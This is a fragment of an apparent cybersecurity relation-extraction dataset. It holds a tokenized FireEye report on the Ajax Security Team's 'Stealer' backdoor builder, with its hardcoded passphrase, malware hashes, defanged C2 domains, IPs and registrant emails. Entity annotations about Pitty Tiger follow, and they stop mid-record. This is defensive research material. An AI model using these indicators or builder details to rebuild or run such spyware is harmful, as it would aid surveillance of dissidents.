["10", "www.fireeye.com", "VS_VERSION_INFO", "VarFileInfo", "Translation"], ["StringFileInfo", "000004b0"], ["Comments", "Process", "for", "Windows", "CompanyName"], ["Microsoft", "FileDescription", "Process", "for", "Windows", "FileVersion"], ["1.0.0.0", "InternalName"], ["Stealer.exe"], ["LegalCopyright"], ["Copyright", "2013"], ["OriginalFilename", "Stealer.exe", "ProductName", "Process", "for", "Windows", "ProductVersion", "1.0.0.0", "Assembly", "Version", "1.0.0.0", "Fireeye", ":", "Operation", "Saffron", "Rose", "2013"], ["The", "\u201c", "Stealer", "\u201d", "Builder", "and", "Tools"], ["During", "our", "research", ",", "we", "recovered", "two", "different", "tools", "used", "by", "the", "members", "of", "the", "Ajax", "Security", "Team", "in", "conjunction", "with", "targeted", "intrusion", "activities", "."], ["The", "first", "tool", ",", "labeled", "the", "\u2018", "Stealer", "Builder", "\u2019", "was", "compiled", "on", "2014", "-", "04", "-", "08", "."], ["This", "compile", "date", "may", "indicate", "that", "the", "group", "is", "still", "active", "."], ["Upon", "executing", "the", "\u2018", "Stealer", "Builder", "\u2019", "the", "user", "is", "presented", "with", "an", "option", "to", "load", "the", "\u2018", "Builder", "\u2019", "or", "to", "\u2018", "Decrypt", "\u2019", "logs", "generated", "from", "a", "victim", "and", "exfiltrated", "to", "a", "command", "-", "and", "-", "control", "(", "CnC", ")", "server", "under", "the", "groups", "\u2019", "control", "."], ["Figure", "8", ":", "The", "Stealer", "Tool", "Figure", "9", ":", "The", "Stealer", "Builder", "11", "www.fireeye.com"], ["The", "Builder", "option", "enables", "an", "attacker", "to", "configure", "a", "new", "Stealer", "backdoor", "."], ["The", "user", "can", "configure", "the", "new", "backdoor", "to", "connect", "to", "a", "specific", "CnC", "server", "with", "a", "personalized", "username", "and", "password", "."], ["The", "attacker", "can", "bind", "the", "backdoor", "to", "a", "legitimate", "application", "of", "his", "or", "her", "choosing", ",", "or", "they", "can", "cloak", "it", "with", "an", "icon", "designed", "to", "make", "the", "backdoor", "appear", "as", "though", "it", "is", "a", "legitimate", "file", "."], ["We", "also", "noted", "that", "the", "Builder", "did", "not", "allow", "the", "attacker", "to", "select", "a", "new", "passphrase", "or", "salt", "used", "to", "encrypt", "the", "stolen", "data", "."], ["The", "passphrase", "\u2018", "HavijeBaba", "\u2019", "and", "a", "salt", "of", "\u2018", "salam!*%", "#", "\u2019", "are", "both", "hardcoded", "into", "the", "builder", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "During", "testing", ",", "we", "observed", "that", "backdoors", "generated", "by", "this", "Stealer", "Builder", "had", "a", "timestamp", "of", "2013", "-", "12", "-", "19", "."], ["We", "had", "one", "backdoor", "in", "our", "repository", "with", "this", "same", "timestamp", "."], ["This", "sample", "(", "MD5", "1823b77b9ee6296a8b997ffb64d32d21", ")", "was", "configured", "to", "exfiltrate", "data", "to", "ultrasms[.]ir", "."], ["The", "VS_VERSION_INFO", "PE", "resource", "mentioned", "above", "(", "SHA256", "5156aca994ecfcb40458ead8c830cd66469d5f5", "a031392898d323a8d7a7f23d3", ")", "is", "an", "artifact", "of", "the", "Stealer", "builder", "that", "we", "recovered", "."], ["The", "builder", "generates", "an", "executable", "named", "IntelRapidStart", "."], ["exe", "."], ["This", "executable", "contains", "the", "aforementioned", "VS_VERSION_INFO", "PE", "resource", "."], ["We", "also", "recovered", "a", "tool", "designed", "to", "encode", "plaintext", "into", "Base64", "encoded", "text", "or", "decode", "Figure", "10", ":", "Base64", "Encoder", "12", "www.fireeye.com", "Base64", "encoded", "text", "into", "plaintext", "."], ["Members", "of", "the", "Ajax", "Security", "Team", "likely", "this", "use", "tool", "to", "encode", "the", "configuration", "data", "seen", "in", "RapidStartTech.stl", "files", "."], ["As", "noted", "above", ",", "the", "RapidStartTech.stl", "contains", "the", "backdoor", "\u2019s", "FTP", "credentials", ",", "implant", "name", ",", "decoy", "name", ",", "and", "screenshot", "interval", ",", "along", "with", "boolean", "settings", "for", "startup", ",", "keylogger", ",", "and", "screenshot", "plugins", "."], ["Encoding", "and", "decoding", "Base64", "data", "is", "a", "straightforward", "task", "and", "the", "standard", "Linux", "operating", "system", "offers", "a", "number", "of", "command", "line", "tools", "to", "achieve", "this", "task", "."], ["The", "presence", "of", "a", "Windows", "-", "based", "GUI", "tool", "that", "simplifies", "encoding", "and", "decoding", "Base64", "data", "indicates", "that", "these", "tools", "may", "have", "been", "developed", "for", "less", "adept", "users", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "Command", "-", "and", "-", "Control", "Infrastructure"], ["The", "CnC", "infrastructure", "consists", "of", "distinct", ",", "but", "linked", ",", "clusters", "that", "have", "targeted", "both", "the", "users", "of", "anti", "-", "censorship", "tools", "in", "Iran", "as", "well", "as", "defense", "contractor", "companies", "in", "the", "U.S."], ["The", "first", "cluster", "contains", "the", "domain", "used", "in", "the", "Aerospace", "Conference", "attack", "as", "well", "as", "the", "domains", "used", "in", "phishing", "attacks", "designed", "to", "capture", "user", "credentials", ":", "Figure", "11", ":", "Ajax", "Security", "Team", "\u2019s", "Phishing", "Infrastructure", "13", "www.fireeye.com"], ["The", "website", "used", "in", "the", "Aerospace", "Conference", "attack", "was", "aeroconf2014[.]org", ",", "which", "is", "registered", "to", "info@usa.gov[.]us", "."], ["However", ",", "historical", "WHOIS", "information", "shows", "that", "the", "domain", "was", "registered", "by", "keyvan.ajaxtm@gmail[.]com", "\u2014", "the", "same", "domain", "used", "to", "register", "ajaxtm[.]org", ",", "the", "website", "of", "the", "Ajax", "Security", "Team", "."], ["The", "same", "email", "addresses", "were", "used", "to", "register", "variations", "of", "domain", "names", "associated", "with", "popular", "services", "provided", "by", "companies", "such", "as", "Google", ",", "Facebook", ",", "Yahoo", "and", "LinkedIn", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013"], ["The", "second", "cluster", "comprises", "the", "CnC", "infrastructure", "used", "in", "the", "anti", "-", "censorship", "attacks", "."], ["The", "majority", "of", "the", "samples", "we", "analyzed", "connect", "to", "intel", "-", "update[.]com", "and", "update", "-", "mirror[.]com", ",", "which", "were", "registered", "by", "james.mateo@aim[.]com", "."], ["The", "domain", "intel", "-", "update[.]com", "resolved", "to", "the", "IP", "address", "88.150.227.197", ",", "which", "also", "hosted", "Figure", "12", ":", "Ajax", "Security", "Team", "\u2019s", "Stealer", "CnC", "Infrastructure", "Figure", "13", ":", "Overlap", "between", "the", "phishing", "and", "stealer", "clusters", "14", "www.fireeye.com", "domains", "registered", "by", "osshom@yahoo[.]com", ",", "many", "of", "which", "are", "consistent", "with", "the", "pattern", "of", "registering", "domains", "with", "associations", "to", "Google", "and", "Yahoo", "services", "."], ["We", "also", "observed", "crossover", "with", "a", "sample", "that", "connected", "to", "both", "intelupdate[.]com", "and", "ultrasms[.]ir", ",", "which", "was", "registered", "by", "lvlr98@gmail[.]com", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "These", "two", "clusters", "are", "linked", "by", "a", "common", "IP", "address", "(", "5.9.244.151", ")", ",", "which", "is", "used", "by", "both", "ns2", ".", "aeroconf2014[.]org", "and", "office.windowsessentials[.]tk", "."], ["A", "third", "cluster", "of", "activity", "was", "found", "via", "analysis", "of", "1d4d9f6e6fa1a07cb0a66a9ee06d624a", "."], ["This", "sample", "is", "a", "Stealer", "variant", "that", "connects", "to", "the", "aforementioned", "intel", "-", "update[.]com", "as", "well", "as", "plugin", "-", "adobe[.]com", "."], ["The", "domain", "plugin", "-", "adobe", "[", ".", "]", "com", "resolved", "to", "81.17.28.235", "."], ["Other", "domains", "seen", "resolving", "to", "IP", "address", "nearby", "include", "the", "following", ":"], ["Aside", "from", "the", "sample", "connecting", "to", "pluginadobe[.]com", ",", "we", "have", "not", "discovered", "any", "malware", "connecting", "to", "these", "domains", "."], ["Victimology"], ["During", "our", "investigation", ",", "we", "were", "able", "to", "recover", "information", "on", "77", "victims", "from", "one", "CnC", "server", "that", "we", "discovered", "while", "analyzing", "malware", "samples", "that", "were", "disguised", "as", "anti", "-", "censorship", "tools", "."], ["While", "analyzing", "the", "data", "from", "the", "victims", ",", "we", "\u2022", "44", "had", "their", "timezone", "set", "to", "\u201c", "Iran", "Standard", "Time", "\u201d", "(", "37", "of", "those", "also", "have", "their", "language", "set", "to", "Persian", ")", "\u2022", "Of", "the", "remaining", "33", ",", "10", "have", "Persian", "language", "settings", "\u2022", "12", "have", "either", "Proxifier", "or", "Psiphon", "installed", "or", "running", "(", "all", "12", "had", "a", "Persian", "language", "setting", "and", "all", "but", "one", "had", "their", "timezone", "set", "to", "\u201c", "Iran", "Standard", "Time", "\u201d", ")", "The", "largest", "concentration", "of", "victims", "is", "in", "Iran", ",", "based", "on", "the", "premise", "that", "Persian", "language", "settings", "and", "\u201c", "Iran", "Standard", "Time", "\u201d", "correlate", "the", "victim", "to", "be", "geographically", "located", "in", "Iran", "."], ["As", "such", ",", "we", "believe", "that", "attackers", "disguised", "malware", "as", "anti", "-", "censorship", "tools", "in", "order", "to", "target", "the", "users", "of", "such", "tools", "inside", "Iran", "as", "well", "as", "Iranian", "dissidents", "outside", "the", "country", "."], ["Domain", "IP", "First", "Seen", "Last", "Seen", "yahoomail.com.co", "81.17.28.227", "2013", "-", "11", "-", "28", "2014", "-", "4", "-", "10", "xn--google-yri.com", "81.17.28.229", "2013", "-", "12", "-", "08", "2014", "-", "01", "-", "15", "privacy-google.com", "appleid.com.co", "accounts-apple.com"], ["users-facebook.com", "81.17.28.229", "81.17.28.231", "81.17.28.231", "81.17.28.231", "xn--facebook-06k.com", "81.17.28.231", "15", "www.fireeye.com", "found", "that", "the", "majority", "had", "either", "their", "timezone", "set", "to", "\u201c", "Iran", "Standard", "Time", "\u201d", "or", "had", "their", "language", "setting", "set", "to", "Persian", ":", "2014", "-", "02", "-", "14", "2014", "-", "02", "-", "20", "2013", "-", "12", "-", "31", "2014", "-", "01", "-", "15", "2013", "-", "11", "-", "27", "2014", "-", "02", "-", "23", "2014", "-", "02", "-", "20", "2014", "-", "02", "-", "20", "2014", "-", "01", "-", "15", "2014", "-", "03", "-", "07", "Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "Attribution"], ["The", "Ajax", "Security", "Team", "appears", "to", "have", "been", "formed", "by", "personas", "named", "\u201c", "HUrr!c4nE", "!", "\u201d", "and", "\u201c", "Cair3x", "\u201d", "in", "2010.24", "Both", "members", "were", "engaged", "in", "website", "defacements", "prior", "to", "the", "forming", "of", "the", "Ajax", "Security", "Team", ",", "and", "both", "were", "members", "of", "Iranian", "hacker", "forums", "such", "as", "ashiyane[.]org", "and", "shabgard[.]org", "."], ["Other", "members", "include", "\u201c", "0day", "\u201d", ",", "\u201c", "Mohammad", "PK", "\u201d", "and", "\u201c", "Crim3r", "\u201d", "."], ["The", "Ajax", "Security", "Team", "website", "at", "ajaxtm[.]org", "had", "a", "Web", "forum", "with", "at", "least", "236", "members", "."], ["The", "group", "published", "several", "exploits", "for", "content", "management", "systems", "and", "engaged", "in", "defacements.25", "Initially", ",", "the", "defacements", "seemed", "to", "be", "motivated", "by", "a", "desire", "to", "demonstrate", "the", "group", "\u2019s", "prowess", "\u2014", "they", "even", "defaced", "an", "Iranian", "government", "website.26"], ["However", ",", "the", "group", "appears", "to", "have", "become", "increasingly", "political", "."], ["For", "example", ",", "in", "a", "blog", "post", "in", "2012", ",", "\u201c", "Cair3x", "\u201d", "announced", "the", "targeting", "of", "Iran", "\u2019s", "political", "opponents", "."], ["Figure", "14", ":", "Cair3x", "\u2019s", "original", "blog", "post", "and", "translation", "Hacking", "anti", "-", "revolution", "political", "and", "opposition", "websites"], ["Hello", "to", "everyone", ",", "After", "a", "while", "of", "operating", "underground", "and", "enhancing", "our", "company", "\u2019s", "projects", "and", "getting", "close", "to", "24", "June", "2012", ",", "and", "the", "martyrdom", "of", "Ayatollah", "Dr.", "Beheshti", "and", "72", "of", "Imam", "Khomeini", "\u2019s", "(", "First", "and", "Former", "supreme", "leader", "of", "Iran", ")", "followers", ",", "we", "have", "planned", "a", "project/", "initiative", "to", "attack", "anti", "-", "revolution", "and", "political", "websites", "against", "the", "Islamic", "Republic", "."], ["And", "in", "late", "hours", "of", "Wednesday", ",", "June", "24", ",", "2012", ",", "we", "attacked", "these", "websites", "and", "defaced", "them", "by", "writing", "the", "words", "\u201c", "We", "are", "young", "but", "we", "can", "\u201d", "on", "their", "websites", "."], ["This", "is", "so", "the", "enemies", "of", "this", "country", "know", "that", "the", "blood", "of", "our", "martyr", "will", "never", "be", "in", "vain", "and", "they", "will", "always", "be", "remembered", "in", "the", "heart", "of", "gallant", "Iranians", "."], ["24", "By", "March", "2010"], ["HUrr!c4nE", "!", "was", "identifying", "as", "a", "member", "of", "Ajax", "Security", "Team", "in", "exploit", "releases", "http://www.exploit-db.com/exploits/17011/", "and", "the", "first", "defacement", "archived", "by", "Zone", "-", "H", ",", "which", "lists", "both", "HUrr!c4nE", "!", "and", "Cair3x", "as", "members", "was", "December", "2010"], ["http://www.zone-h.org/mirror/"], ["id/12730879", "16", "www.fireeye.com", "25", "http://osvdb.org/affiliations/1768-ajax-security-team", "http://www.exploit-db.com/author/?a=3223", "http://packetstormsecurity.com/files/author/9928/", "26", "http://www.zone-h.org/mirror/id/13225183", "Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "In", "2013", ",", "the", "Ajax", "Security", "Team", ",", "and", "\u201c", "HUrr!c4nE", "!", "\u201d"], ["in", "particular", ",", "took", "part", "in", "\u201c", "#", "OpIsrael", "\u201d", "and", "\u201c", "#", "OpUSA\u201d.27"], ["By", "early", "2014", ",", "the", "Ajax", "Security", "Team", "appears", "to", "have", "dwindled", "."], ["There", "have", "been", "no", "defacements", "since", "December", "2013", "."], ["The", "website", "and", "forum", "at", "ajaxtm[.]org", "operated", "by", "\u201c", "HUrr!c4nE", "!", "\u201d", ",", "aka", "\u201c", "k3yv4n", "\u201d", ",", "is", "no", "longer", "active", "."], ["\u201c", "HUrr!c4nE", "!", "\u201d", "has", "the", "most", "open", "/", "documented", "Internet", "persona", "of", "the", "Ajax", "Security", "Team", "."], ["He", "registered", "the", "ajaxtm[.]org", "domain", "name", "using", "the", "email", "address", "keyvan.ajaxtm@gmail[.]com", "."], ["This", "was", "also", "the", "email", "address", "used", "to", "register", "the", "domain", "aerospace2014[.]org", ",", "which", "was", "used", "in", "spear", "phishing", "attacks", "against", "companies", "in", "the", "U.S.", "and", "is", "linked", "with", "malware", "activity", "directed", "at", "users", "of", "anti", "-", "censorship", "tools", "in", "Iran", "."], ["Figure", "15", ":"], ["Screenshot", "of", "the", "defacement", "content", "used", "in", "#", "OpUSA", "27", "Ashraf", ",", "N.", "\u201c", "#", "OpIsrael", ":", "Hacktivists", "Starting", "Cyber", "Attack", "against", "Israel", "on", "7th", "of", "April", "\u201d", "."], ["March", "2013", "."], ["\u201c", "OpUSA", "Targeting", "Government", "&", "Financial", "Sectors", "on", "07", "May", "2013", ":", "Likely", "Tools", ",", "Targets", "and", "Mitigating", "Measures", "\u201d", "."], ["May", "2013", "."], ["17", "www.fireeye.com", "Fireeye", ":", "Operation", "Saffron", "Rose", "2013"], ["\u201c", "HUrr!c4nE", "!", "\u201d", "features", "prominently", "in", "all", "the", "group", "\u2019s", "activities", "and", "defacements", "."], ["Although", "there", "has", "been", "a", "decline", "in", "public", "-", "facing", "Ajax", "Security", "Team", "activity", ",", "this", "coincides", "with", "an", "increase", "in", "malware", "activity", "linked", "to", "the", "group", "\u2019s", "infrastructure", "."], ["\u2022"], ["~2009", "\u2014", "Membership", "in", "ashiyane.org", "and", "shabgard.org", "forums", "\u2022", "2010", "\u2013", "2012", "\u2014", "Defacements", ",", "Release", "of", "exploits", "for", "CMS", "\u2022", "2012", "\u2013", "2013", "\u2014", "Increasing", "politicization", ",", "participation", "on", "#", "OpIsrael", ",", "#", "OpUSA", "\u2022", "2013", "\u2013", "2014", "\u2014", "Transition", "to", "cyber", "-", "espionage"], ["The", "increasing", "politicization", "of", "the", "Ajax", "Security", "Team", "aligns", "with", "the", "timing", "of", "their", "activities", "against", "the", "perceived", "enemies", "of", "Iran", "."], ["In", "addition", "to", "attacking", "companies", "in", "the", "U.S.", ",", "they", "have", "targeted", "domestic", "users", "of", "anti", "-", "censorship", "technology", "."], ["While", "the", "objectives", "of", "this", "group", "are", "consistent", "with", "Iran", "\u2019s", "efforts", "at", "controlling", "political", "dissent", "and", "expanding", "offensive", "cyber", "capabilities", ",", "the", "relationship", "between", "this", "group", "and", "the", "Iranian", "government", "remains", "inconclusive", "."], ["For", "example", ",", "the", "Ajax", "Security", "Team", "could", "just", "be", "using", "anti", "-", "censorship", "tools", "as", "a", "lure", "because", "they", "are", "popular", "in", "Iran", ",", "in", "order", "to", "engage", "in", "activities", "that", "would", "be", "considered", "traditional", "cybercrime", "."], ["In", "one", "case", ",", "\u201c", "HUrr!c4nE", "!", "\u201d", ",", "using", "the", "email", "address", "keyvan.ajaxtm@gmail[.]com", ",", "has", "been", "flagged", "for", "possible", "fraud", "by", "an", "online", "retailer", "."], ["While", "\u201c", "HUrr!c4nE", "!", "\u201d", "is", "engaged", "in", "operations", "that", "align", "with", "Iran", "\u2019s", "political", "objectives", ",", "he", "may", "also", "be", "dabbling", "in", "traditional", "cybercrime", "."], ["This", "indicates", "that", "there", "is", "a", "considerable", "grey", "area", "between", "the", "cyber", "espionage", "capabilities", "of", "Iran", "\u2019s", "hacker", "groups", "and", "any", "direct", "Iranian", "government", "or", "military", "involvement", "."], ["On", "the", "spectrum", "of", "state", "responsibility", ",", "these", "attacks", "align", "with", "state", "-", "encouraged", "attacks", ",", "which", "are", "defined", "as", "attacks", "in", "which", ":", "Third", "parties", "control", "and", "conduct", "the", "attack", ",", "but", "the", "national", "government", "encourages", "them", "as", "a", "matter", "of", "policy.28"], ["Recruiting", "hackers", "through", "this", "model", "allows", "Iran", "to", "influence", "their", "activities", ",", "and", "provides", "the", "Iranian", "government", "plausible", "deniability", ",", "but", "a", "lack", "of", "direct", "control", "also", "means", "that", "the", "groups", "may", "be", "unpredictable", "and", "engage", "in", "unsanctioned", "attacks", "."], ["Figure", "16", ":"], ["Screenshot", "of", "an", "online", "retailer", "\u2019s", "fraud", "alert", "28", "18", "www.fireeye.com", "Healey", ",", "J.", "\u201c", "Beyond", "Attribution", ":", "Seeking", "National", "Responsibility", "for", "Cyber", "Attacks", "\u201d", "."], ["January", "2012", "."], ["Fireeye", ":", "Operation", "Saffron", "Rose", "2013", "Conclusion", "About", "FireEye"], ["The", "increased", "politicization", "of", "the", "Ajax", "Security", "Team", ",", "and", "the", "transition", "from", "nuisance", "defacements", "to", "operations", "against", "internal", "dissidents", "and", "foreign", "targets", ",", "coincides", "with", "moves", "by", "Iran", "aimed", "at", "increasing", "offensive", "cyber", "capabilities", "."], ["While", "the", "relationship", "between", "actors", "such", "as", "the", "Ajax", "Security", "Team", "and", "the", "Iranian", "government", "is", "unknown", ",", "their", "activities", "appear", "to", "align", "with", "Iranian", "government", "political", "objectives", "."], ["FireEye", "has", "invented", "a", "purpose", "-", "built", ",", "virtual", "machine", "-", "based", "security", "platform", "that", "provides", "real", "-", "time", "threat", "protection", "to", "enterprises", "and", "governments", "worldwide", "against", "the", "next", "generation", "of", "cyber", "attacks", "."], ["These", "highly", "sophisticated", "cyber", "attacks", "easily", "circumvent", "traditional", "signature", "-", "based", "defenses", ",", "such", "as", "next", "-", "generation", "firewalls", ",", "IPS", ",", "anti", "-", "virus", ",", "and", "gateways", "."], ["The", "FireEye", "Threat", "Prevention", "Platform", "provides", "real", "-", "time", ",", "dynamic", "threat", "protection", "without", "the", "use", "of", "signatures", "to", "protect", "an", "organization", "across", "the", "primary", "threat", "vectors", "and", "across", "the", "different", "stages", "of", "an", "attack", "life", "cycle", "."], ["The", "capabilities", "of", "the", "Ajax", "Security", "Team", "remain", "unclear", "."], ["This", "group", "uses", "at", "least", "one", "malware", "family", "that", "is", "not", "publicly", "available", "."], ["We", "have", "not", "directly", "observed", "the", "Ajax", "Security", "Team", "use", "exploits", "to", "deliver", "malware", ",", "but", "it", "is", "unclear", "if", "they", "or", "other", "Iranian", "actors", "are", "capable", "of", "producing", "or", "acquiring", "exploit", "code", "."], ["While", "the", "Ajax", "Security", "Team", "\u2019s", "capabilities", "remain", "unclear", ",", "we", "know", "that", "their", "current", "operations", "have", "been", "somewhat", "successful", "as", "measured", "by", "the", "number", "of", "victims", "seen", "checking", "into", "to", "an", "Ajax", "Security", "Team", "controlled", "CnC", "server", "."], ["We", "believe", "that", "if", "these", "actors", "continue", "the", "current", "pace", "of", "their", "operations", "they", "will", "improve", "their", "capabilities", "in", "the", "mid", "-", "term", "."], ["The", "core", "of", "the", "FireEye", "platform", "is", "a", "virtual", "execution", "engine", ",", "complemented", "by", "dynamic", "threat", "intelligence", ",", "to", "identify", "and", "block", "cyber", "attacks", "in", "real", "time", "."], ["FireEye", "has", "over", "1,500", "customers", "across", "more", "than", "40", "countries", ",", "including", "over", "100", "of", "the", "Fortune", "500", "."], ["We", "thank", "Kenneth", "Geers", "and", "Jen", "Weedon", "for", "their", "support", "and", "analysis", "on", "these", "findings", "."], ["FireEye", ",", "Inc.", "|", "1440", "McCarthy", "Blvd", "."], ["Milpitas", ",", "CA", "95035", "|", "408.321.6300", "|", "877.FIREEYE", "(", "347.3393", ")", "|", "info@fireeye.com", "|", "www.fireeye.com", "\u00a9", "2014", "FireEye", ",", "Inc."], ["All", "rights", "reserved", "."], ["FireEye", "is", "a", "registered", "trademark", "of", "FireEye", ",", "Inc."], ["All", "other", "brands", ",", "products", ",", "or", "service", "names", "are", "or", "may", "be", "trademarks", "or", "service", "marks", "of", "their", "respective", "owners", "."], ["\u2013", "RPT.OSR.EN", "-", "US.082014", "19", "www.fireeye.com"]]}, {"vertexSet": [[{"name": "Pitty Tiger", "pos": [23, 25], "sent_id": 5, "type": "AttackerGroup"}], [{"name": "Pitty Tiger", "pos": [0, 2], "sent_id": 8, "type": "AttackerGroup"}], [{"name": "PittyTiger", "pos": [7, 8], "sent_id": 11, "type": "MalwareFamily"}], [{"name": "June 2014", "pos": [6, 8], "sent_id": 13, "type": "Time"}], [{"name": "Pitty Tiger", "pos": [10, 12], "sent_id": 14, "type": "AttackerGroup"}], [{"name": "2011", "pos": [18, 19], "sent_id": 14, "type": "Time"}], [{"name": "2010", "pos": [33, 34], "sent_id": 14, "type": "Time"}], [{"name": "PittyTiger RAT", "pos": [16, 18], "sent_id": 15, "type": "Malware"}], [{"name": "PlugX", "pos": [0, 1], "sent_id": 17, "type": "Malware"}], [{"name": "PittyTiger", "pos": [5, 6], "sent_id": 18, "type": "Malware"}], [{"name": "Troj/ReRol.A", "pos": [0, 5], "sent_id": 19, "type": "TrojanHorse"}], [{"name": "CT RAT", "pos": [6, 8], "sent_id": 19, "type": "Malware"}], [{"name": "MM RAT", "pos": [8, 10], "sent_id": 19, "type": "TrojanHorse"}], [{"name": "Troj/Goldsun-B", "pos": [12, 17], "sent_id": 19, "type": "TrojanHorse"}], [{"name": "Paladin RAT", "pos": [2, 4], "sent_id": 20, "type": "Malware"}], [{"name": "Gh0st RAT", "pos": [8, 10], "sent_id": 20, "type": "Malware"}], [{"name": "spear phishing", "pos": [19, 21], "sent_id": 20, "type": "Exploit"}], [{"name": "Pitty Tiger", "pos": [0, 2], "sent_id": 24, "type": "AttackerGroup"}], [{"name": "HeartBleed", "pos": [7, 8], "sent_id": 25, "type": "Vulnerability"}], [{"name": "Pitty Tiger", "pos": [8, 10], "sent_id": 26, "type": "Attacker"}], [{"name": "Microsoft Office Word document", "pos": [18, 22], "sent_id": 26, "type": "Malware"}], [{"name": "CVE-2012-0158", "pos": [28, 31], "sent_id": 26, "type": "Vulnerability"}], [{"name": "CVE-2014-1761", "pos": [5, 8], "sent_id": 27, "type": "Vulnerability"}], [{"name": "Troj/ReRol.A", "pos": [10, 15], "sent_id": 28, "type": "TrojanHorse"}], [{"name": "Pitty Tiger", "pos": [11, 13], "sent_id": 29, "type": "Campaign"}], [{"name": "PittyTiger", "pos": [3, 4], "sent_id": 30, "type": "Malware"}], [{"name": "Pitty Tiger", "pos": [1, 3], "sent_id": 33, "type": "Indicator"}], [{"name": "CT RAT", "pos": [0, 2], "sent_id": 35, "type": "Malware"}], [{"name": "PittyTiger", "pos": [8, 9], "sent_id": 35, "type": "Malware"}], [{"name": "MM RAT", "pos": [4, 6], "sent_id": 38, "type": "Malware"}], [{"name": "Troj/Goldsun-B", "pos": [27, 32], "sent_id": 38, "type": "Malware"}], [{"name": "Sophos", "pos": [35, 36], "sent_id": 38, "type": "Organization"}], [{"name": "Pitty Tiger", "pos": [10, 12], "sent_id": 39, "type": "Attacker"}], [{"name": "Paladin RAT", "pos": [0, 2], "sent_id": 40, "type": "Exploit"}], [{"name": "Pitty Tiger", "pos": [10, 12], "sent_id": 40, "type": "Attacker"}], [{"name": "Gh0st RAT", "pos": [8, 10], "sent_id": 41, "type": "Malware"}], [{"name": "Paladin RAT", "pos": [3, 5], "sent_id": 44, "type": "Exploit"}], [{"name": "Gh0st RAT", "pos": [13, 15], "sent_id": 44, "type": "Malware"}], [{"name": "Paladin", "pos": [29, 30], "sent_id": 45, "type": "Exploit"}], [{"name": "Pitty Tiger", "pos": [35, 37], "sent_id": 45, "type": "Attacker"}], [{"name": "Pitty Tiger", "pos": [0, 2], "sent_id": 51, "type": "Attacker"}], [{"name": "avstore.com.tw", "pos": [4, 5], "sent_id": 52, "type": "Indicator"}], [{"name": "sophos.skypetm.com.tw", "pos": [6, 7], "sent_id": 52, "type": "Indicator"}], [{"name": "symantecs.com.tw", "pos": [8, 9], "sent_id": 52, "type": "Indicator"}], [{"name": "trendmicro.org.tw", "pos": [10, 11], "sent_id": 52, "type": "Indicator"}], [{"name": "Pitty Tiger", "pos": [13, 15], "sent_id": 53, "type": "Attacker"}], [{"name": "Pitty Tiger", "pos": [4, 6], "sent_id": 55, "type": "Attacker"}], [{"name": "private company from the defense industry", "pos": [14, 20], "sent_id": 55, "type": "ExploitTargetObject"}], [{"name": "academic network of a government", "pos": [22, 27], "sent_id": 55, "type": "ExploitTargetObject"}], [{"name": "Pitty Tiger", "pos": [7, 9], "sent_id": 59, "type": "AttackerGroup"}], [{"name": "China", "pos": [27, 28], "sent_id": 60, "type": "Campaign"}], [{"name": "TooT", "pos": [0, 1], "sent_id": 65, "type": "Attacker"}], [{"name": "TooT", "pos": [11, 12], "sent_id": 66, "type": "Attacker"}], [{"name": "Automn Snow", "pos": [12, 14], "sent_id": 68, "type": "Attacker"}], [{"name": "Cold Air Kiss", "pos": [18, 21], "sent_id": 68, "type": "Attacker"}], [{"name": "Chen", "pos": [5, 6], "sent_id": 72, "type": "Attacker"}], [{"name": "Lilly", "pos": [5, 6], "sent_id": 74, "type": "Attacker"}], [{"name": "Troj/ReRol.A", "pos": [30, 35], "sent_id": 77, "type": "Malware"}], [{"name": "MM RAT", "pos": [4, 6], "sent_id": 78, "type": "Exploit"}], [{"name": "CT RAT", "pos": [7, 9], "sent_id": 78, "type": "Exploit"}], [{"name": "Pitty Tiger", "pos": [10, 12], "sent_id": 78, "type": "Exploit"}], [{"name": "Paladin", "pos": [13, 14], "sent_id": 78, "type": "Exploit"}], [{"name": "cp.exe", "pos": [6, 7], "sent_id": 79, "type": "Exploit"}], [{"name": "mailpv.exe", "pos": [8, 9], "sent_id": 79, "type": "Exploit"}], [{"name": "gsecdump", "pos": [3, 4], "sent_id": 80, "type": "Exploit"}], [{"name": "NirSoft", "pos": [5, 6], "sent_id": 80, "type": "Exploit"}], [{"name": "Mimikatz", "pos": [8, 9], "sent_id": 80, "type": "Exploit"}], [{"name": "pr.exe", "pos": [3, 4], "sent_id": 81, "type": "Exploit"}], [{"name": "po.exe", "pos": [5, 6], "sent_id": 82, "type": "Exploit"}], [{"name": "ssql.exe", "pos": [3, 4], "sent_id": 83, "type": "Exploit"}], [{"name": "Fluxay", "pos": [5, 6], "sent_id": 83, "type": "Exploit"}], [{"name": "Pitty Tiger", "pos": [11, 13], "sent_id": 85, "type": "Exploit"}], [{"name": "CT RAT", "pos": [14, 16], "sent_id": 85, "type": "Exploit"}], [{"name": "CT RAT", "pos": [28, 30], "sent_id": 85, "type": "Exploit"}], [{"name": "Pitty Tiger", "pos": [33, 35], "sent_id": 85, "type": "Exploit"}], [{"name": "CT RAT", "pos": [4, 6], "sent_id": 86, "type": "Exploit"}], [{"name": "Pitty Tiger", "pos": [11, 13], "sent_id": 86, "type": "Malware"}], [{"name": "Pitty Tiger", "pos": [18, 20], "sent_id": 86, "type": "Malware"}], [{"name": "calc.exe", "pos": [8, 9], "sent_id": 87, "type": "Exploit"}]], "labels": [{"r": "P16", "h": 2, "t": 7, "evidence": [11, 15]}, {"r": "P22", "h": 24, "t": 23, "evidence": [28, 29]}, {"r": "P2", "h": 19, "t": 20, "evidence": [26]}, {"r": "P7", "h": 20, "t": 21, "evidence": [26]}, {"r": "P7", "h": 20, "t": 22, "evidence": [26, 27]}, {"r": "P21", "h": 26, "t": 25, "evidence": [30, 33]}, {"r": "P2", "h": 32, "t": 30, "evidence": [38, 39]}, {"r": "P2", "h": 32, "t": 29, "evidence": [38, 39]}, {"r": "P2", "h": 34, "t": 33, "evidence": [40]}, {"r": "P2", "h": 39, "t": 36, "evidence": [44, 45]}, {"r": "P2", "h": 39, "t": 38, "evidence": [45]}, {"r": "P3", "h": 52, "t": 49, "evidence": [59, 66]}, {"r": "P3", "h": 51, "t": 49, "evidence": [59, 65]}, {"r": "P3", "h": 53, "t": 49, "evidence": [59, 68]}, {"r": "P3", "h": 54, "t": 49, "evidence": [59, 68]}, {"r": "P3", "h": 55, "t": 49, "evidence": [59, 